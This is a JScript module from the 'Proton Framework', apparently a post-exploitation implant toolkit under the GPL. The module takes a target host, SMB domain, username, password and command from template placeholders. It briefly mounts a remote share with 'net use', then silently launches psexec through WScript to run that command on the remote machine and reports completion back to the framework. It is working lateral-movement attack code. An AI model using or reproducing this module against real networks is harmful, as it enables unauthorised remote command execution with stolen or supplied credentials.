//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var rpath = "~RPATH~"
    var UNC = "~RPATH~\\psexec.exe ";
    var domain = "~SMBDOMAIN~";
    var user = "~SMBUSER~";
    var pwd = "~SMBPASS~";
    var computer = "\\\\~RHOST~ ";

    UNC += computer;

    if (user != "" && pwd != "")
    {
        if (domain != "")
        {
            user = '"' + domain + "\\" + user + '"';
        }

        UNC += "-u " + user + " -p " + pwd + " ";
    }

    UNC += " -accepteula ~CMD~";

    // crappy hack to make sure it mounts

    var output = proton.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+proton.uuid()+".txt");

    if (output.indexOf("Drive") != -1)
    {
        var drive = output.split(" ")[1];
        proton.shell.run("net use " + drive + " /delete", true);
    }
    proton.WS.Run("%comspec% /q /c " + UNC, 0, true);

    proton.work.report("Complete");
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
